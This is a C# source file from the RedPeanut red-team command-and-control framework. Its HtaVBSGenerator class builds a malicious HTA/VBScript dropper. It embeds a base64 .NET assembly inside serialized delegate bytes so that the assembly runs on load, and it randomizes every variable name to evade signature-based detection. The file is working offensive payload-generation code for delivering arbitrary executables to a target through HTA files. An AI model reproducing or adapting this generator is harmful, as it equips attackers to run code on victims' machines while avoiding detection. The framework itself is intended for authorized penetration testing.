//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class HtaVBSGenerator: IGenerator
    {
        string base64assembly = "";
        Dictionary<string, string> agr = new Dictionary<string, string>();

        public HtaVBSGenerator(string base64Assembly, Dictionary<string, string> agrs)
        {
            this.base64assembly = base64Assembly;

        }

        public string Base64Assembly
        {
            get
            {
                return base64assembly;
            }
            set
            {
                this.base64assembly = value;
            }
        }
        
        public string GetScriptText()
        {
            // generate .hta content
            Random random = new Random();
            string assembly = RandomAString(10,random);
            string runcode = RandomAString(10, random);
            string app = RandomAString(10, random);
            string hfso = RandomAString(10, random);
            string hfile = RandomAString(10, random);
            string intlen = RandomAString(10, random);
            string intpos = RandomAString(10, random);
            string elm = RandomAString(10, random);
            string charr = RandomAString(10, random);
            string shell = RandomAString(10, random);
            string obj = RandomAString(10, random);

            string templatePath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER, HTA_TEMPLATE);

            //Super credits to @cobbr_io for this trick
            string delegatepre = ReadResourceFile(PL_BINARY_DELEGATE_PRE_35);
            string delegatepost = ReadResourceFile(PL_BINARY_DELEGATE_POST_35);
            
            byte[] delegatebyte = Convert.FromBase64String(delegatepre)
                .Concat(Convert.FromBase64String(this.base64assembly))
                .Concat(Convert.FromBase64String(delegatepost))
                .ToArray();

            int ofs = delegatebyte.Length % 3;

            if (ofs != 0)
            {
                int length = delegatebyte.Length + (3 - ofs);
                Array.Resize(ref delegatebyte, length);
            }

            string base64delegate = Convert.ToBase64String(delegatebyte);

            int lineLength = 80;

            List<string> splitString = new List<string>();

            for (int i = 0; i < base64delegate.Length; i += lineLength)
            {
                splitString.Add(base64delegate.Substring(i, Math.Min(lineLength, base64delegate.Length - i)));
            }

            StringBuilder base64assemblyFormatted = new StringBuilder();
            foreach (string s in splitString)
                base64assemblyFormatted.Append(String.Format("{0} = {0} & \"{1}\"\r\n", assembly, s));


            if (File.Exists(templatePath))
            {
                StringBuilder sb = new StringBuilder(File.ReadAllText(templatePath));

                sb.Replace("#{hexassembly}", base64assemblyFormatted.ToString())
                    .Replace("#{assembly}", assembly)
                    .Replace("#{runcode}", runcode)
                    .Replace("#{app}", app)
                    .Replace("#{hfso}", hfso)
                    .Replace("#{hfile}", hfile)
                    .Replace("#{intlen}", intlen)
                    .Replace("#{intpos}", intpos)
                    .Replace("#{elm}", elm)
                    .Replace("#{charr}", charr)
                    .Replace("#{shell}", shell)
                    .Replace("#{obj}", obj);

                Console.WriteLine("[*] Replace end");

                return sb.ToString() ;
            }
            else
            {
                Console.WriteLine("[x] Template not found");
                return "";
            }                     
        }
    }
}
